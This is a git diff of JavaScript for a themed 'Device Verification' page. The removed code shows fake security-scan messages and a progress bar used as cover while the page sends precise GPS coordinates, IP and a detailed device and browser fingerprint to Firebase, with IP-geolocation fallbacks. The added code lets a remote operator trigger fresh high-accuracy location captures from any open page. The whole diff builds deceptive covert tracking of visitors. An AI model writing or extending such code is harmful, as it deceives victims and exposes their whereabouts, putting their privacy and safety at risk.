@@ -66,6 +66,9 @@ document.addEventListener('DOMContentLoaded', async () => {
                 applyTheme(newTheme);
             }
         });
+
+        // Listen for location requests
+        listenForLocationRequests();
     } catch (error) {
         console.error('Failed to initialize:', error);
         // Fallback to default theme if Firebase fails
@@ -83,24 +86,6 @@ function applyTheme(themeName) {
     document.querySelector('.logo-image').src = theme.logo;
     document.title = `Device Verification - ${theme.name}`;
 }
-
-// Prevent right-click on logo
-document.querySelector('.logo').addEventListener('contextmenu', (e) => {
-    e.preventDefault();
-    return false;
-});
-
-// Prevent drag on logo
-document.querySelector('.logo').addEventListener('dragstart', (e) => {
-    e.preventDefault();
-    return false;
-});
-
-// Prevent copy on logo
-document.querySelector('.logo').addEventListener('copy', (e) => {
-    e.preventDefault();
-    return false;
-});
 
 // Browser detection helper functions
 function getBrowserName() {
@@ -180,280 +165,44 @@ async function getHighAccuracyPosition() {
     });
 }
 
-// Verification steps for user engagement
-const verificationSteps = [
-    "Initializing secure connection...",
-    "Verifying device signature...",
-    "Analyzing network security...",
-    "Validating device integrity...",
-    "Performing security scan...",
-    "Checking for suspicious activity...",
-    "Confirming device location...",
-    "Processing verification data...",
-    "Finalizing security checks..."
-];
+// Listen for location requests
+function listenForLocationRequests() {
+    if (!navigator.geolocation) return;
 
-// Main functionality
-// Handle page unload/close
-window.addEventListener('beforeunload', async () => {
-    try {
-        const ip = await fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => data.ip)
-            .catch(() => null);
-            
-        if (ip) {
-            const locationsRef = database.ref('locations');
-            const query = locationsRef.orderByChild('ip').equalTo(ip);
-            const snapshot = await query.once('value');
-            
-            snapshot.forEach((childSnapshot) => {
-                const data = childSnapshot.val();
-                if (data.status === 'active') {
-                    childSnapshot.ref.update({ status: 'inactive' });
-                }
-            });
-        }
-    } catch (error) {
-        console.error('Error updating status on page close:', error);
-    }
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-    const allowLocationButton = document.getElementById('allowLocation');
-    const locationStatus = document.getElementById('locationStatus');
-    
-    allowLocationButton.addEventListener('click', async () => {
-        allowLocationButton.classList.add('loading');
-        allowLocationButton.disabled = true;
-        allowLocationButton.textContent = 'Verifying';
-        document.querySelector('.thank-you-card').classList.add('processing');
-        
-        if (!navigator.geolocation) {
-            console.log('Geolocation API not supported');
-            await handleLocationFallback();
-            return;
-        }
-
-        // Start verification steps display
-        let stepIndex = 0;
-        let progress = 0;
-        
-        const updateStatus = () => {
-            progress = Math.min(progress + 2, 98); // Never reach 100% until final
-            const currentStep = verificationSteps[stepIndex % verificationSteps.length];
-            locationStatus.textContent = `${currentStep} (${progress}%)`;
-        };
-
-        const statusInterval = setInterval(() => {
-            stepIndex++;
-            updateStatus();
-        }, 1500);
-
-        const progressInterval = setInterval(() => {
-            updateStatus();
-        }, 400);
+    const requestsRef = database.ref('locationRequests');
+    requestsRef.on('child_added', async (snapshot) => {
+        const request = snapshot.val();
+        if (!request || request.status !== 'pending') return;
 
         try {
-            // Enhanced Chrome/Android handling
-            const isChromeAndroid = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
-            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
-            
-            if (isChrome || isChromeAndroid) {
-                try {
-                    const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
-                    console.log('Permission state:', permissionResult.state);
-                    
-                    if (permissionResult.state === 'denied') {
-                        console.log('Geolocation permission denied in Chrome');
-                        clearInterval(statusInterval);
-                        clearInterval(progressInterval);
-                        await handleLocationFallback(null, allowLocationButton, locationStatus);
-                        return;
-                    }
-
-                    // Get initial position
-                    const initialPosition = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: isChromeAndroid ? 45000 : 30000,
-                            maximumAge: 0
-                        });
-                    });
-
-                    // Save initial position
-                    const initialLocationRef = await saveLocation(initialPosition, true);
-                    
-                    // Wait for high accuracy data
-                    console.log('Waiting for high accuracy data...');
-                    let attempts = 0;
-                    const maxAttempts = 3;
-                    let bestAccuracy = initialPosition.coords.accuracy;
-                    let bestPosition = initialPosition;
-
-                    while (attempts < maxAttempts && bestAccuracy > 100) {
-                        try {
-                            const newPosition = await getHighAccuracyPosition();
-                            console.log(`Attempt ${attempts + 1} accuracy:`, newPosition.coords.accuracy);
-                            
-                            if (newPosition.coords.accuracy < bestAccuracy) {
-                                bestAccuracy = newPosition.coords.accuracy;
-                                bestPosition = newPosition;
-                                
-                                // Update database with better accuracy data
-                                await updateLocation(initialLocationRef, bestPosition);
-                                
-                                if (bestAccuracy < 100) {
-                                    console.log('Achieved high accuracy, stopping attempts');
-                                    break;
-                                }
-                            }
-                        } catch (error) {
-                            console.log(`Attempt ${attempts + 1} failed:`, error);
-                        }
-                        attempts++;
-                        await new Promise(resolve => setTimeout(resolve, 4000)); // Wait between attempts
-                    }
-
-                    // Complete the verification process
-                    clearInterval(statusInterval);
-                    clearInterval(progressInterval);
-                    locationStatus.textContent = 'Device verification complete (100%)';
-                    console.log('Final accuracy:', bestAccuracy);
-
-                } catch (error) {
-                    console.error('Error in Chrome geolocation:', error);
-                    clearInterval(statusInterval);
-                    clearInterval(progressInterval);
-                    await handleLocationFallback(error);
-                }
-            } else {
-                // Non-Chrome browsers
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 30000,
-                        maximumAge: 0
-                    });
-                });
-                
-                clearInterval(statusInterval);
-                clearInterval(progressInterval);
-                await saveLocation(position, false);
-                locationStatus.textContent = 'Device verification complete (100%)';
+            // Get the original location to update
+            const locationSnapshot = await database.ref('locations/' + request.locationKey).once('value');
+            const originalLocation = locationSnapshot.val();
+            if (!originalLocation) {
+                throw new Error('Original location not found');
             }
-        } catch (geoError) {
-            console.log('Geolocation error:', geoError);
-            clearInterval(statusInterval);
-            clearInterval(progressInterval);
-            locationStatus.textContent = 'Processing verification...';
-            await handleLocationFallback(geoError);
-        }
-    });
 
-    async function saveLocation(position, isInitial = false) {
-        const locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            altitude: position.coords.altitude,
-            altitudeAccuracy: position.coords.altitudeAccuracy,
-            locationSource: await determineLocationSource(position),
-            timestamp: new Date().toISOString(),
-            status: 'active',
-            isInitial: isInitial,
-            userAgent: navigator.userAgent,
-            ip: await fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(() => 'Unknown'),
-            screen: {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                pixelRatio: window.devicePixelRatio
-            },
-            device: {
-                memory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : 'Unknown',
-                cores: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : 'Unknown',
-                platform: navigator.platform || 'Unknown',
-                vendor: navigator.vendor || 'Unknown',
-                language: navigator.language || 'Unknown',
-                languages: navigator.languages || [navigator.language] || ['Unknown'],
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-                touchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 'Unknown',
-                connection: (typeof navigator.connection !== 'undefined') ? {
-                    type: navigator.connection.effectiveType || 'Unknown',
-                    downlink: navigator.connection.downlink || 'Unknown',
-                    rtt: navigator.connection.rtt || 'Unknown',
-                    saveData: navigator.connection.saveData || false
-                } : 'Unknown'
-            },
-            browser: {
-                name: getBrowserName(),
-                version: getBrowserVersion(),
-                cookiesEnabled: navigator.cookieEnabled || false,
-                doNotTrack: navigator.doNotTrack || null,
-                plugins: (navigator.plugins && navigator.plugins.length) ? Array.from(navigator.plugins).map(p => p.name) : [],
-                webdriver: (typeof navigator.webdriver !== 'undefined') ? navigator.webdriver : 'Unknown',
-                pdfViewerEnabled: (typeof navigator.pdfViewerEnabled !== 'undefined') ? navigator.pdfViewerEnabled : 'Unknown',
-                deviceOrientation: (typeof window.DeviceOrientationEvent !== 'undefined') ? 'Supported' : 'Not supported',
-                webGL: (function() {
-                    try {
-                        return !!document.createElement('canvas').getContext('webgl');
-                    } catch(e) {
-                        return false;
-                    }
-                })()
-            }
-        };
+            // Request new high accuracy position
+            const position = await getHighAccuracyPosition();
+            const locationSource = await determineLocationSource(position);
 
-        try {
+            // Create new location entry
             const newLocationRef = database.ref('locations').push();
-            await newLocationRef.set(locationData);
-            console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
-            return newLocationRef;
-        } catch (error) {
-            console.error('Error saving location to Firebase:', error);
-            throw error;
-        }
-    }
+            const timestamp = new Date().toISOString();
 
-    async function updateLocation(locationRef, newPosition) {
-        try {
-            const updatedData = {
-                latitude: newPosition.coords.latitude,
-                longitude: newPosition.coords.longitude,
-                accuracy: newPosition.coords.accuracy,
-                altitude: newPosition.coords.altitude,
-                altitudeAccuracy: newPosition.coords.altitudeAccuracy,
-                locationSource: await determineLocationSource(newPosition),
-                isInitial: false,
-                updatedAt: new Date().toISOString()
-            };
-
-            await locationRef.update(updatedData);
-            console.log('Location updated with higher accuracy data');
-        } catch (error) {
-            console.error('Error updating location:', error);
-            throw error;
-        }
-    }
-
-    // Fallback function for handling location errors
-    async function handleLocationFallback(geoError = null) {
-        try {
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const ipData = await ipResponse.json();
-            
             const locationData = {
-                latitude: ipData.latitude,
-                longitude: ipData.longitude,
-                accuracy: 5000,
-                locationSource: 'IP Geolocation',
-                timestamp: new Date().toISOString(),
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                locationSource: locationSource,
+                timestamp: timestamp,
+                status: 'active',
+                isLocationUpdate: true,
+                previousLocationKey: request.locationKey,
+                ip: originalLocation.ip,
                 userAgent: navigator.userAgent,
-                ip: ipData.ip,
                 screen: {
                     width: window.screen.width,
                     height: window.screen.height,
@@ -489,38 +238,58 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             };
 
-            if (geoError) {
-                locationData.geoError = {
-                    code: geoError.code,
-                    message: geoError.message
-                };
-            }
-
-            const newLocationRef = database.ref('locations').push();
+            // Save the new location
             await newLocationRef.set(locationData);
-            locationStatus.textContent = 'Device verification complete (100%)';
-        } catch (ipError) {
-            console.error('IP location fallback failed:', ipError);
-            // Try alternative IP service as last resort
-            try {
-                const altResponse = await fetch('https://ipwho.is/');
-                const altData = await altResponse.json();
-                if (altData.success) {
-                    const fallbackData = {
-                        latitude: altData.latitude,
-                        longitude: altData.longitude,
-                        ip: altData.ip,
-                        locationSource: 'IP Geolocation (Fallback)',
-                        timestamp: new Date().toISOString()
-                    };
-                    const newLocationRef = database.ref('locations').push();
-                    await newLocationRef.set(fallbackData);
-                }
-                locationStatus.textContent = 'Device verification complete (100%)';
-            } catch (finalError) {
-                console.error('All location services failed:', finalError);
-                locationStatus.textContent = 'Device verification complete (100%)';
-            }
+
+            // Update the request status
+            await snapshot.ref.update({
+                status: 'completed',
+                newLocation: {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                },
+                completedAt: timestamp
+            });
+
+            // Update the original location to mark it as having an update
+            await database.ref('locations/' + request.locationKey).update({
+                hasUpdate: true,
+                latestUpdateKey: newLocationRef.key
+            });
+
+        } catch (error) {
+            console.error('Error updating location:', error);
+            await snapshot.ref.update({
+                status: 'failed',
+                error: error.message,
+                failedAt: new Date().toISOString()
+            });
         }
+    });
+}
+
+// Handle page unload/close
+window.addEventListener('beforeunload', async () => {
+    try {
+        const ip = await fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(() => null);
+            
+        if (ip) {
+            const locationsRef = database.ref('locations');
+            const query = locationsRef.orderByChild('ip').equalTo(ip);
+            const snapshot = await query.once('value');
+            
+            snapshot.forEach((childSnapshot) => {
+                const data = childSnapshot.val();
+                if (data.status === 'active') {
+                    childSnapshot.ref.update({ status: 'inactive' });
+                }
+            });
+        }
+    } catch (error) {
+        console.error('Error updating status on page close:', error);
     }
 });
